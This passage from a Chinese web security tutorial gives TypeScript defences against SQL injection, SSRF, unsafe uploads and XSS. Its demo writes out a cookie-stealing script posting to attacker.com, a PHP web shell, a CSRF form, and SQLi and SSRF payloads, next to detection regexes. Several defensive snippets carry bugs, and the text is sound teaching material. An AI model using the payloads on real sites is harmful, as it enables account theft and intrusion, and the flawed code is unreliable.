  // 虽然 SQL 注入被阻止，但如果 bio 后来被渲染到页面 → Stored XSS

  // Step 2: 读取后直接使用
  // const user = db.query('SELECT * FROM users WHERE username = ?', ['attacker']);
  // res.render('profile', { bio: user.bio }); // Stored XSS!
}

// ✅ 安全流程: 参数化查询 + 输出编码
function safeSecondary1() {
  const user = db.query('SELECT * FROM users WHERE username = ?', ['attacker']);
  // 输出时编码
  res.render('profile', { bio: OutputEncoder.forHtml(user.bio) });
}
```

### 4.2 参数化查询完整示例

```typescript
// --- File: src/security/sql-safe-queries.ts ---

/**
 * 安全 SQL 查询工具集
 * 所有查询使用参数化，禁止字符串拼接
 */

// ==================== 查询构建器 ====================
class SafeQueryBuilder {
  private clauses: string[] = [];
  private params: any[] = [];

  /** WHERE 条件 (安全参数化) */
  where(column: string, operator: string, value: any): this {
    // 白名单列名 (防止列名注入)
    if (!/^[a-zA-Z_][a-zA-Z0-9_]*$/.test(column)) {
      throw new Error(`Invalid column name: ${column}`);
    }
    // 白名单操作符
    const allowedOps = ['=', '!=', '>', '<', '>=', '<=', 'LIKE', 'IN', 'IS', 'IS NOT'];
    if (!allowedOps.includes(operator.toUpperCase())) {
      throw new Error(`Invalid operator: ${operator}`);
    }
    this.clauses.push(`${column} ${operator.toUpperCase()} ?`);
    this.params.push(value);
    return this;
  }

  /** WHERE IN (安全参数化) */
  whereIn(column: string, values: any[]): this {
    if (!/^[a-zA-Z_][a-zA-Z0-9_]*$/.test(column)) {
      throw new Error(`Invalid column name: ${column}`);
    }
    if (values.length === 0) {
      this.clauses.push('1 = 0'); // 空数组 → 无结果
    } else {
      const placeholders = values.map(() => '?').join(', ');
      this.clauses.push(`${column} IN (${placeholders})`);
      this.params.push(...values);
    }
    return this;
  }

  /** ORDER BY (白名单列名 + 方向) */
  orderBy(column: string, direction: 'ASC' | 'DESC' = 'ASC'): this {
    if (!/^[a-zA-Z_][a-zA-Z0-9_]*$/.test(column)) {
      throw new Error(`Invalid column name: ${column}`);
    }
    if (!this.clauses._orderBy) this.clauses._orderBy = [];
    this.clauses._orderBy.push(`${column} ${direction}`);
    return this;
  }

  /** LIMIT / OFFSET (只允许数字) */
  limit(count: number): this {
    if (!Number.isInteger(count) || count < 0 || count > 1000) {
      throw new Error('Invalid limit');
    }
    this.clauses._limit = count;
    return this;
  }

  offset(count: number): this {
    if (!Number.isInteger(count) || count < 0) {
      throw new Error('Invalid offset');
    }
    this.clauses._offset = count;
    return this;
  }

  /** 生成最终 SQL */
  build(table: string): { sql: string; params: any[] } {
    if (!/^[a-zA-Z_][a-zA-Z0-9_]*$/.test(table)) {
      throw new Error(`Invalid table name: ${table}`);
    }

    let sql = `SELECT * FROM ${table}`;

    if (this.clauses.length > 0) {
      sql += ' WHERE ' + this.clauses.join(' AND ');
    }

    if (this.clauses._orderBy?.length > 0) {
      sql += ' ORDER BY ' + this.clauses._orderBy.join(', ');
    }

    if (this.clauses._limit !== undefined) {
      sql += ' LIMIT ?';
      this.params.push(this.clauses._limit);
    }

    if (this.clauses._offset !== undefined) {
      sql += ' OFFSET ?';
      this.params.push(this.clauses._offset);
    }

    return { sql, params: this.params };
  }
}

// ==================== 使用示例 ====================

// 安全查询: 搜索用户
const qb = new SafeQueryBuilder();
const { sql, params } = qb
  .where('status', '=', 'active')
  .where('age', '>=', 18)
  .whereIn('role', ['admin', 'editor'])
  .orderBy('created_at', 'DESC')
  .limit(20)
  .offset(0)
  .build('users');

console.log(sql);
// → SELECT * FROM users WHERE status = ? AND age >= ? AND role IN (?, ?) ORDER BY created_at DESC LIMIT ? OFFSET ?
console.log(params);
// → ['active', 18, 'admin', 'editor', 20, 0]

// 执行查询 (以 mysql2 为例)
// const [rows] = await connection.execute(sql, params);

// ==================== INSERT / UPDATE 安全构建器 ====================
class SafeMutationBuilder {
  private table: string;
  private data: Record<string, any> = {};

  constructor(table: string) {
    if (!/^[a-zA-Z_][a-zA-Z0-9_]*$/.test(table)) {
      throw new Error(`Invalid table name: ${table}`);
    }
    this.table = table;
  }

  set(column: string, value: any): this {
    if (!/^[a-zA-Z_][a-zA-Z0-9_]*$/.test(column)) {
      throw new Error(`Invalid column name: ${column}`);
    }
    this.data[column] = value;
    return this;
  }

  buildInsert(): { sql: string; params: any[] } {
    const columns = Object.keys(this.data);
    const placeholders = columns.map(() => '?').join(', ');
    const sql = `INSERT INTO ${this.table} (${columns.join(', ')}) VALUES (${placeholders})`;
    return { sql, params: Object.values(this.data) };
  }

  buildUpdate(whereColumn: string, whereValue: any): { sql: string; params: any[] } {
    if (!/^[a-zA-Z_][a-zA-Z0-9_]*$/.test(whereColumn)) {
      throw new Error(`Invalid column name: ${whereColumn}`);
    }
    const setClauses = Object.keys(this.data).map(col => `${col} = ?`);
    const sql = `UPDATE ${this.table} SET ${setClauses.join(', ')} WHERE ${whereColumn} = ?`;
    return { sql, params: [...Object.values(this.data), whereValue] };
  }
}

// 使用
const insert = new SafeMutationBuilder('users')
  .set('username', 'jack')
  .set('email', 'jack@example.com')
  .set('age', 25)
  .buildInsert();

console.log(insert.sql);
// → INSERT INTO users (username, email, age) VALUES (?, ?, ?)
```

---

## 五、SSRF 攻防实战

### 5.1 SSRF 攻击与防御

```typescript
// --- File: src/security/ssrf-protection.ts ---

/**
 * SSRF (Server-Side Request Forgery) 防护
 * 防止攻击者利用服务器发起内部网络请求
 */

import net from 'net';

// ==================== IP 地址工具 ====================
class IpUtils {
  /**
   * 解析域名并返回真实 IP
   */
  static async resolveIp(hostname: string): Promise<string> {
    return new Promise((resolve, reject) => {
      require('dns').resolve4(hostname, (err: any, addresses: string[]) => {
        if (err) reject(err);
        else resolve(addresses[0]);
      });
    });
  }

  /**
   * 判断是否为内网 IP
   */
  static isPrivateIp(ip: string): boolean {
    // 10.0.0.0/8
    if (ip.startsWith('10.')) return true;
    // 172.16.0.0/12
    if (ip.startsWith('172.')) {
      const second = parseInt(ip.split('.')[1]);
      if (second >= 16 && second <= 31) return true;
    }
    // 192.168.0.0/16
    if (ip.startsWith('192.168.')) return true;
    // 127.0.0.0/8 (localhost)
    if (ip.startsWith('127.')) return true;
    // 0.0.0.0
    if (ip === '0.0.0.0') return true;
    // 169.254.0.0/16 (link-local, AWS metadata)
    if (ip.startsWith('169.254.')) return true;
    // ::1 (IPv6 localhost)
    if (ip === '::1') return true;
    // fe80:: (IPv6 link-local)
    if (ip.startsWith('fe80:')) return true;
    return false;
  }

  /**
   * 检测 DNS Rebinding 攻击
   * 第一次解析和第二次解析 IP 不同 → 可能是攻击
   */
  static async checkDnsRebinding(hostname: string): Promise<boolean> {
    const ip1 = await this.resolveIp(hostname);
    // 短暂延迟后再次解析
    await new Promise(r => setTimeout(r, 100));
    const ip2 = await this.resolveIp(hostname);
    return ip1 !== ip2;
  }
}

// ==================== SSRF 防护器 ====================
interface FetchOptions {
  timeout?: number;
  maxRedirects?: number;
  allowedHosts?: string[];
  blockPrivateIps?: boolean;
}

class SsrfProtector {
  private options: Required<FetchOptions>;

  constructor(options: FetchOptions = {}) {
    this.options = {
      timeout: options.timeout || 5000,
      maxRedirects: options.maxRedirects || 3,
      allowedHosts: options.allowedHosts || [],
      blockPrivateIps: options.blockPrivateIps !== false,
    };
  }

  /**
   * 安全获取 URL
   */
  async safeFetch(url: string): Promise<Response> {
    // 1. 解析 URL
    let parsedUrl: URL;
    try {
      parsedUrl = new URL(url);
    } catch {
      throw new Error('Invalid URL format');
    }

    // 2. 协议白名单
    if (!['http:', 'https:'].includes(parsedUrl.protocol)) {
      throw new Error(`Protocol ${parsedUrl.protocol} not allowed`);
    }

    // 3. 主机白名单
    if (this.options.allowedHosts.length > 0) {
      const host = parsedUrl.hostname;
      const isAllowed = this.options.allowedHosts.some(allowed => {
        if (allowed.startsWith('.')) {
          return host.endsWith(allowed); // 子域名匹配
        }
        return host === allowed;
      });
      if (!isAllowed) {
        throw new Error(`Host ${host} not in allowed list`);
      }
    }

    // 4. DNS 解析 + 内网 IP 检查
    if (this.options.blockPrivateIps) {
      const ip = await IpUtils.resolveIp(parsedUrl.hostname);
      if (IpUtils.isPrivateIp(ip)) {
        throw new Error(`Access to private IP ${ip} blocked`);
      }

      // 5. DNS Rebinding 检测
      const isRebinding = await IpUtils.checkDnsRebinding(parsedUrl.hostname);
      if (isRebinding) {
        throw new Error('DNS rebinding attack detected');
      }
    }

    // 6. 发起请求 (带超时)
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), this.options.timeout);

    try {
      const response = await fetch(url, {
        signal: controller.signal,
        redirect: 'manual', // 不自动跟随重定向
      });

      // 7. 检查重定向目标
      if (response.status >= 300 && response.status < 400) {
        const location = response.headers.get('location');
        if (location && this.options.maxRedirects > 0) {
          // 递归检查重定向目标
          return this.safeFetch(location);
        }
      }

      return response;
    } finally {
      clearTimeout(timeoutId);
    }
  }
}

// ==================== 使用示例 ====================
const protector = new SsrfProtector({
  allowedHosts: ['api.example.com', '.cdn.example.com'],
  blockPrivateIps: true,
  timeout: 5000,
});

// ✅ 安全: 允许的域名
// await protector.safeFetch('https://api.example.com/data');

// ❌ 被阻止: 内网地址
// await protector.safeFetch('http://169.254.169.254/latest/meta-data/');
// → Error: Access to private IP blocked (AWS metadata!)

// ❌ 被阻止: localhost
// await protector.safeFetch('http://localhost:3000/admin');
// → Error: Access to private IP blocked

// ❌ 被阻止: 危险协议
// await protector.safeFetch('file:///etc/passwd');
// → Error: Protocol file: not allowed
```

---

## 六、文件上传安全实战

### 6.1 完整文件上传安全方案

```typescript
// --- File: src/security/file-upload-security.ts ---

/**
 * 文件上传安全方案
 * 包含: 类型验证 / 大小限制 / 内容检测 / 重命名 / 存储隔离
 */

import crypto from 'crypto';
import path from 'path';
import fs from 'fs';

// ==================== 文件类型白名单 ====================
const FILE_TYPE_WHITELIST: Record<string, {
  mime: string;
  extensions: string[];
  maxBytes: number;
  magicNumbers?: number[][];
}> = {
  image: {
    mime: 'image',
    extensions: ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.svg'],
    maxBytes: 5 * 1024 * 1024, // 5MB
    magicNumbers: [
      [0xFF, 0xD8, 0xFF],                    // JPEG
      [0x89, 0x50, 0x4E, 0x47],              // PNG
      [0x47, 0x49, 0x46, 0x38],              // GIF
      [0x52, 0x49, 0x46, 0x46],              // WebP (RIFF)
    ],
  },
  document: {
    mime: 'application',
    extensions: ['.pdf', '.doc', '.docx'],
    maxBytes: 10 * 1024 * 1024, // 10MB
    magicNumbers: [
      [0x25, 0x50, 0x44, 0x46],              // PDF (%PDF)
    ],
  },
};

// ==================== 文件验证器 ====================
class FileValidator {
  /**
   * 验证文件类型 (三重验证)
   * 1. 扩展名
   * 2. MIME 类型
   * 3. Magic Number (文件头)
   */
  static async validate(file: {
    originalname: string;
    mimetype: string;
    buffer: Buffer;
    size: number;
  }, category: 'image' | 'document'): Promise<{ valid: boolean; reason?: string }> {
    const config = FILE_TYPE_WHITELIST[category];
    if (!config) {
      return { valid: false, reason: 'Unknown file category' };
    }

    // 1. 扩展名验证
    const ext = path.extname(file.originalname).toLowerCase();
    // 处理双扩展名攻击 (e.g., shell.jpg.php)
    const nameParts = file.originalname.split('.');
    if (nameParts.length > 2) {
      return { valid: false, reason: 'Multiple extensions not allowed' };
    }
    if (!config.extensions.includes(ext)) {
      return { valid: false, reason: `Extension ${ext} not allowed` };
    }

    // 2. MIME 类型验证
    if (!file.mimetype.startsWith(config.mime)) {
      return { valid: false, reason: `MIME type ${file.mimetype} not allowed` };
    }

    // 3. 文件大小验证
    if (file.size > config.maxBytes) {
      return { valid: false, reason: `File too large (${file.size} > ${config.maxBytes})` };
    }

    // 4. Magic Number 验证 (文件头签名)
    if (config.magicNumbers) {
      const header = file.buffer.slice(0, 8);
      const hasValidMagic = config.magicNumbers.some(magic => {
        if (header.length < magic.length) return false;
        return magic.every((byte, i) => header[i] === byte);
      });
      if (!hasValidMagic) {
        return { valid: false, reason: 'Invalid file signature (magic number mismatch)' };
      }
    }

    return { valid: true };
  }

  /**
   * 生成安全文件名
   * 原始文件名 → UUID + 安全扩展名
   */
  static generateSafeName(originalName: string): string {
    const ext = path.extname(originalName).toLowerCase();
    const uuid = crypto.randomBytes(16).toString('hex');
    return `${uuid}${ext}`;
  }

  /**
   * 验证文件名安全
   */
  static validateFileName(filename: string): boolean {
    // 禁止路径遍历
    if (filename.includes('..') || filename.includes('/') || filename.includes('\\')) {
      return false;
    }
    // 禁止特殊字符
    if (/[^a-zA-Z0-9._-]/.test(filename)) {
      return false;
    }
    // 禁止空文件名
    if (!filename || filename.length > 255) {
      return false;
    }
    return true;
  }
}

// ==================== 安全上传中间件 ====================
interface UploadConfig {
  category: 'image' | 'document';
  uploadDir: string;
  maxFiles?: number;
}

function createSecureUpload(config: UploadConfig) {
  return async (files: any[]) => {
    const results = [];

    for (const file of files) {
      // 1. 验证
      const validation = await FileValidator.validate(file, config.category);
      if (!validation.valid) {
        results.push({ file: file.originalname, status: 'rejected', reason: validation.reason });
        continue;
      }

      // 2. 生成安全文件名
      const safeName = FileValidator.generateSafeName(file.originalname);

      // 3. 存储到隔离目录
      const categoryDir = path.join(config.uploadDir, config.category);
      const safePath = path.join(categoryDir, safeName);

      // 确保路径在目标目录内
      const resolvedPath = path.resolve(safePath);
      if (!resolvedPath.startsWith(path.resolve(categoryDir))) {
        results.push({ file: file.originalname, status: 'rejected', reason: 'Path traversal detected' });
        continue;
      }

      // 4. 写入文件
      fs.writeFileSync(resolvedPath, file.buffer);

      // 5. 设置权限 (仅所有者可读写)
      fs.chmodSync(resolvedPath, 0o644);

      results.push({
        file: file.originalname,
        status: 'uploaded',
        safeName,
        path: safePath,
        size: file.size,
      });
    }

    return results;
  };
}

// ==================== SVG 特殊处理 ====================
/**
 * SVG 文件可能包含恶意脚本
 * 需要额外清理
 */
function sanitizeSvg(content: string): string {
  return content
    // 移除 script 标签
    .replace(/<script[\s>][\s\S]*?<\/script>/gi, '')
    // 移除事件处理器
    .replace(/\son\w+\s*=\s*["'][^"']*["']/gi, '')
    // 移除 foreignObject (可嵌入 HTML)
    .replace(/<foreignObject[\s>][\s\S]*?<\/foreignObject>/gi, '')
    // 移除 animation (可能触发外部请求)
    .replace(/<animate[\s>][\s\S]*?\/?>/gi, '')
    .replace(/<animateMotion[\s>][\s\S]*?\/?>/gi, '')
    // 移除 href 中的 javascript:
    .replace(/href\s*=\s*["']javascript:[^"']*["']/gi, 'href="#"')
    // 移除 style 中的 url() 外部引用
    .replace(/url\s*\(\s*["']?(https?:\/\/[^)]+)["']?\s*\)/gi, 'url(#)')
    .trim();
}
```

---

## 七、安全中间件完整实现

### 7.1 综合安全中间件

```typescript
// --- File: src/security/security-middleware.ts ---

/**
 * 综合安全中间件
 * 集成: Helmet + CSP + 速率限制 + 安全头 + 请求日志
 */

import crypto from 'crypto';

// ==================== 安全头中间件 ====================
function securityHeaders(req: any, res: any, next: any) {
  // CSP
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.cspNonce = nonce;

  res.setHeader('Content-Security-Policy', [
    "default-src 'self'",
    `script-src 'self' 'nonce-${nonce}'`,
    "style-src 'self' 'nonce-${nonce}'",
    "img-src 'self' data: https:",
    "font-src 'self'",
    "connect-src 'self'",
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "upgrade-insecure-requests",
  ].join('; '));

  // 其他安全头
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '0'); // 现代浏览器不需要
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');

  next();
}

// ==================== 请求日志中间件 (安全审计) ====================
function securityAuditLogger(req: any, res: any, next: any) {
  const startTime = Date.now();

  // 记录敏感操作
  const sensitivePaths = ['/login', '/register', '/transfer', '/admin', '/password'];
  const isSensitive = sensitivePaths.some(p => req.path.startsWith(p));

  // 异常检测
  const anomalies: string[] = [];

  // 1. 异常 User-Agent
  const ua = req.headers['user-agent'] || '';
  if (/bot|crawler|spider|scan/i.test(ua)) {
    anomalies.push('suspicious_user_agent');
  }

  // 2. 过大请求体
  const contentLength = parseInt(req.headers['content-length'] || '0');
  if (contentLength > 10 * 1024 * 1024) {
    anomalies.push('large_payload');
  }

  // 3. 异常 Header
  if (req.headers['x-forwarded-for'] && req.headers['x-forwarded-for'].split(',').length > 10) {
    anomalies.push('suspicious_x_forwarded_for');
  }

  // 4. SQL 注入特征
  const allParams = JSON.stringify({ ...req.query, ...req.body });
  if (/(union\s+select|drop\s+table|;\s*delete|or\s+1\s*=\s*1|'--)/i.test(allParams)) {
    anomalies.push('sql_injection_pattern');
  }

  // 5. XSS 特征
  if (/(<script|javascript:|on\w+\s*=)/i.test(allParams)) {
    anomalies.push('xss_pattern');
  }

  // 响应完成后记录
  res.on('finish', () => {
    const duration = Date.now() - startTime;
    const logEntry = {
      timestamp: new Date().toISOString(),
      method: req.method,
      path: req.path,
      statusCode: res.statusCode,
      duration: `${duration}ms`,
      ip: req.ip || req.headers['x-forwarded-for'] || 'unknown',
      userAgent: ua.substring(0, 200),
      isSensitive,
      anomalies: anomalies.length > 0 ? anomalies : undefined,
    };

    // 只记录异常或敏感操作
    if (isSensitive || anomalies.length > 0 || res.statusCode >= 400) {
      console.log(JSON.stringify(logEntry));
    }
  });

  next();
}

// ==================== 速率限制配置 ====================
function createRateLimiters() {
  return {
    // 通用 API: 100 次/分钟
    api: {
      windowMs: 60 * 1000,
      max: 100,
      message: { error: 'Too many requests', code: 'RATE_LIMIT' },
    },

    // 登录: 5 次/分钟 (防暴力破解)
    login: {
      windowMs: 60 * 1000,
      max: 5,
      message: { error: 'Too many login attempts', code: 'LOGIN_RATE_LIMIT' },
      statusCode: 429,
      skipSuccessfulRequests: true, // 成功的请求不计入限制
    },

    // 注册: 3 次/小时
    register: {
      windowMs: 60 * 60 * 1000,
      max: 3,
      message: { error: 'Too many registration attempts', code: 'REGISTER_RATE_LIMIT' },
    },

    // 密码重置: 3 次/小时
    passwordReset: {
      windowMs: 60 * 60 * 1000,
      max: 3,
      message: { error: 'Too many password reset attempts', code: 'RESET_RATE_LIMIT' },
    },

    // 文件上传: 10 次/分钟
    upload: {
      windowMs: 60 * 1000,
      max: 10,
      message: { error: 'Too many upload attempts', code: 'UPLOAD_RATE_LIMIT' },
    },
  };
}

// ==================== 安全中间件组合 ====================
function applySecurityMiddleware(app: any) {
  // 1. 安全头
  app.use(securityHeaders);

  // 2. 安全审计日志
  app.use(securityAuditLogger);

  // 3. 信任代理 (如果前面有反向代理)
  app.set('trust proxy', 1);

  // 4. 解析限制
  app.use(require('express').json({ limit: '1mb' }));
  app.use(require('express').urlencoded({ extended: true, limit: '1mb' }));

  // 5. 速率限制
  const rateLimiters = createRateLimiters();
  const rateLimit = require('express-rate-limit');

  app.use('/api/', rateLimit(rateLimiters.api));
  app.use('/api/auth/login', rateLimit(rateLimiters.login));
  app.use('/api/auth/register', rateLimit(rateLimiters.register));
  app.use('/api/auth/reset-password', rateLimit(rateLimiters.passwordReset));
  app.use('/api/upload', rateLimit(rateLimiters.upload));

  // 6. Helmet (额外安全头)
  const helmet = require('helmet');
  app.use(helmet());

  // 7. CORS (严格配置)
  const cors = require('cors');
  app.use(cors({
    origin: ['https://yourdomain.com', 'https://www.yourdomain.com'],
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token'],
    credentials: true,
    maxAge: 600, // 预检请求缓存 10 分钟
  }));
}
```

---

## 八、前端安全工具集

### 8.1 前端安全 SDK

```typescript
// --- File: src/security/frontend-security-sdk.ts ---

/**
 * 前端安全 SDK
 * 包含: CSP 违规上报 / XSS 检测 / 点击劫持防护 / 调试器检测
 */

// ==================== CSP 违规上报 ====================
class CspReporter {
  private reportUrl: string;

  constructor(reportUrl: string) {
    this.reportUrl = reportUrl;
  }

  init() {
    document.addEventListener('securitypolicyviolation', (event: any) => {
      const report = {
        directive: event.violatedDirective,
        blockedUri: event.blockedURI,
        lineNumber: event.lineNumber,
        columnNumber: event.columnNumber,
        sourceFile: event.sourceFile,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString(),
      };

      // 使用 sendBeacon (页面关闭时也能发送)
      if (navigator.sendBeacon) {
        const blob = new Blob([JSON.stringify(report)], { type: 'application/json' });
        navigator.sendBeacon(this.reportUrl, blob);
      } else {
        fetch(this.reportUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(report),
          keepalive: true,
        }).catch(() => {});
      }
    });
  }
}

// ==================== 点击劫持防护 ====================
class ClickJackingProtector {
  /**
   * 框架破坏脚本 (iframe busting)
   * 如果页面被嵌入 iframe，自动跳出
   */
  static frameBusting() {
    if (window.top !== window.self) {
      window.top.location = window.self.location;
    }
  }

  /**
   * 更安全的版本: 隐藏 body，直到确认不在 iframe 中
   */
  static safeFrameBusting() {
    // 在 HTML <head> 中内联执行
    // <style id="anti-clickjack">body { display: none !important; }</style>
    const style = document.getElementById('anti-clickjack') as HTMLStyleElement;
    if (window.top === window.self) {
      if (style) style.remove();
    } else {
      window.top.location = window.self.location;
    }
  }
}

// ==================== 调试器检测 ====================
class DebuggerDetector {
  /**
   * 检测开发者工具是否打开
   * 注意: 这只是增加攻击成本，不能完全阻止
   */
  static isDevToolsOpen(): boolean {
    const threshold = 160;
    return (
      window.outerHeight - window.innerHeight > threshold ||
      window.outerWidth - window.innerWidth > threshold
    );
  }

  /**
   * 定时检测 (可选)
   */
  static startMonitoring(callback: (isOpen: boolean) => void, intervalMs = 1000) {
    setInterval(() => {
      callback(this.isDevToolsOpen());
    }, intervalMs);
  }
}

// ==================== 敏感操作二次确认 ====================
class SensitiveActionGuard {
  /**
   * 敏感操作前要求重新输入密码
   */
  static async requireReauth(prompt: string): Promise<boolean> {
    return new Promise((resolve) => {
      const password = prompt(prompt);
      if (!password) {
        resolve(false);
        return;
      }

      fetch('/api/auth/reauthenticate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password }),
      })
        .then(res => resolve(res.ok))
        .catch(() => resolve(false));
    });
  }

  /**
   * 操作频率限制 (前端)
   */
  static createActionLimiter(maxActions: number, windowMs: number) {
    const actions: number[] = [];

    return () => {
      const now = Date.now();
      // 清理过期记录
      while (actions.length > 0 && actions[0] < now - windowMs) {
        actions.shift();
      }

      if (actions.length >= maxActions) {
        return false; // 超出限制
      }

      actions.push(now);
      return true;
    };
  }
}

// ==================== 前端安全初始化 ====================
function initFrontendSecurity(config: {
  cspReportUrl?: string;
  preventClickjacking?: boolean;
}) {
  // 1. CSP 违规上报
  if (config.cspReportUrl) {
    new CspReporter(config.cspReportUrl).init();
  }

  // 2. 点击劫持防护
  if (config.preventClickjacking !== false) {
    ClickJackingProtector.frameBusting();
  }
}
```

---

## 九、漏洞扫描 Checklist

### 9.1 代码审查 Checklist

```markdown
# Web 安全代码审查 Checklist

## XSS 防护
- [ ] 所有用户输入输出都经过编码 (HTML/JS/URL/CSS 上下文)
- [ ] 不使用 innerHTML 直接渲染用户输入
- [ ] 不使用 document.write 渲染用户输入
- [ ] 不使用 eval() / new Function() 执行用户输入
- [ ] 富文本使用 DOMPurify 清理
- [ ] CSP 已配置且足够严格
- [ ] 外部链接添加 rel="noopener noreferrer"
- [ ] iframe 使用 sandbox 属性
- [ ] postMessage 验证 event.origin

## CSRF 防护
- [ ] 状态变更操作使用 POST/PUT/DELETE (非 GET)
- [ ] 敏感操作有 CSRF Token 验证
- [ ] Cookie 设置 SameSite 属性
- [ ] API 验证 Origin/Referer 头
- [ ] 双重提交 Cookie 已实现 (如需要)
- [ ] 登录/转账等敏感操作有二次确认

## SQL 注入
- [ ] 所有 SQL 查询使用参数化
- [ ] 不使用字符串拼接构建 SQL
- [ ] 表名/列名使用白名单验证
- [ ] ORM/查询构建器正确使用
- [ ] 数据库账号权限最小化
- [ ] 错误信息不泄露数据库结构

## 认证与授权
- [ ] 密码使用 bcrypt/argon2 哈希
- [ ] Session 使用 HttpOnly + Secure + SameSite Cookie
- [ ] JWT 使用强密钥签名
- [ ] Token 有过期时间
- [ ] 登录有速率限制
- [ ] 密码重置流程安全 (一次性 Token)
- [ ] 敏感操作有二次认证
- [ ] 注销时清除 Session/Token

## 输入验证
- [ ] 所有输入有类型/长度/格式验证
- [ ] 使用白名单验证 (非黑名单)
- [ ] 文件上传有类型/大小/内容验证
- [ ] URL 输入有协议白名单
- [ ] 路径输入防止目录遍历
- [ ] JSON 输入使用 JSON.parse (非 eval)

## 安全配置
- [ ] HTTPS 强制启用
- [ ] CSP 响应头已配置
- [ ] X-Frame-Options 已设置
- [ ] X-Content-Type-Options: nosniff
- [ ] HSTS 已启用
- [ ] CORS 严格配置 (非 *)
- [ ] 错误页面不泄露技术细节
- [ ] 生产环境关闭 debug 模式
- [ ] 依赖定期更新 (npm audit)

## 数据安全
- [ ] 敏感数据加密存储
- [ ] API 响应不返回多余字段
- [ ] 日志不记录密码/Token
- [ ] 文件上传隔离存储
- [ ] 备份数据加密
- [ ] 删除数据时真正清除

## API 安全
- [ ] API 有认证机制
- [ ] API 有速率限制
- [ ] API 输入有验证
- [ ] API 错误返回标准格式
- [ ] API 版本控制
- [ ] 敏感 API 有审计日志
- [ ] GraphQL 有查询复杂度限制
```

### 9.2 自动化扫描命令

```bash
# ==================== 依赖漏洞扫描 ====================
npm audit                    # npm 内置
npm audit --fix             # 自动修复
npx audit-ci --moderate     # CI 集成

# ==================== SAST 静态分析 ====================
npx semgrep --config auto . # Semgrep 扫描
npx eslint --plugin security . # ESLint 安全规则

# ==================== 动态扫描 ====================
# OWASP ZAP (Docker)
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t https://your-site.com

# ==================== 密码强度测试 ====================
# 检查密码哈希算法
grep -r "md5\|sha1\|sha256" --include="*.js" --include="*.ts" src/
# 应该只看到 bcrypt/argon2

# ==================== 硬编码密钥检测 ====================
grep -rn "password\s*=\s*['\"]" --include="*.js" --include="*.ts" src/
grep -rn "secret\s*=\s*['\"]" --include="*.js" --include="*.ts" src/
grep -rn "api_key\s*=\s*['\"]" --include="*.js" --include="*.ts" src/

# ==================== 不安全函数检测 ====================
grep -rn "eval(" --include="*.js" --include="*.ts" src/
grep -rn "innerHTML\s*=" --include="*.js" --include="*.ts" src/
grep -rn "document.write" --include="*.js" --include="*.ts" src/
grep -rn "new Function" --include="*.js" --include="*.ts" src/
grep -rn '\`SELECT.*\$\{' --include="*.js" --include="*.ts" src/
```

---

## 十、综合攻防演练场景

### 场景: 完整的博客平台安全攻防

```typescript
// --- File: src/security/blog-platform-security-demo.ts ---

/**
 * 博客平台安全攻防演示
 * 模拟真实场景中的攻击与防御
 */

// ==================== 攻击者视角 ====================
const attacker = {
  // 攻击 1: 存储型 XSS (通过评论)
  xssAttack1: `<script>
    fetch('https://attacker.com/steal?cookie=' + document.cookie + '&url=' + location.href);
  </script>`,

  // 攻击 2: DOM 型 XSS (通过 URL hash)
  xssAttack2: `<img src=x onerror="alert(document.domain)">`,

  // 攻击 3: CSRF (通过恶意网站)
  csrfAttack: `
    <form action="https://blog.com/api/post/delete" method="POST" id="f">
      <input name="postId" value="123">
    </form>
    <script>document.getElementById('f').submit();</script>
  `,

  // 攻击 4: SQL 注入 (通过搜索)
  sqliAttack: `' UNION SELECT username, password FROM users --`,

  // 攻击 5: SSRF (通过图片 URL)
  ssrfAttack: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`,

  // 攻击 6: 文件上传 (通过头像)
  fileUploadAttack: {
    name: 'avatar.jpg.php',
    content: '<?php system($_GET["cmd"]); ?>',
    mime: 'image/jpeg', // 伪造 MIME
  },
};

// ==================== 防御者视角 ====================
const defender = {
  // 防御 1: XSS → DOMPurify + CSP + 输出编码
  defendXss(input: string): string {
    // Layer 1: DOMPurify 清理
    let cleaned = DOMPurify.sanitize(input, {
      ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a'],
      ALLOWED_ATTR: ['href'],
    });
    // Layer 2: CSP 阻止内联脚本执行
    // Layer 3: 输出编码 (textContent 自动编码)
    return cleaned;
  },

  // 防御 2: CSRF → Token + SameSite + Origin
  defendCsrf(req: any): boolean {
    // Layer 1: SameSite Cookie
    // Layer 2: CSRF Token 验证
    const token = req.headers['x-csrf-token'];
    if (!token || !verifyCsrfToken(token, req.session.csrfTokenHash)) return false;
    // Layer 3: Origin 检查
    if (req.headers.origin && !req.headers.origin.includes('blog.com')) return false;
    return true;
  },

  // 防御 3: SQL 注入 → 参数化查询
  defendSqli(searchTerm: string): { sql: string; params: any[] } {
    // 参数化查询，数据库驱动自动转义
    return {
      sql: 'SELECT * FROM posts WHERE title LIKE ? OR content LIKE ?',
      params: [`%${searchTerm}%`, `%${searchTerm}%`],
    };
  },

  // 防御 4: SSRF → IP 白名单 + 协议限制
  defendSsrf(url: string): boolean {
    try {
      const parsed = new URL(url);
      if (!['http:', 'https:'].includes(parsed.protocol)) return false;
      if (IpUtils.isPrivateIp(parsed.hostname)) return false;
      return true;
    } catch {
      return false;
    }
  },

  // 防御 5: 文件上传 → 三重验证 + 重命名 + 隔离存储
  async defendUpload(file: any): Promise<boolean> {
    const validation = await FileValidator.validate(file, 'image');
    return validation.valid;
  },
};

// ==================== 攻防结果 ====================
console.log('=== 博客平台安全攻防结果 ===\n');

// XSS 攻防
console.log('1. XSS 攻击 → 防御后:');
console.log('   攻击:', attacker.xssAttack1.substring(0, 50) + '...');
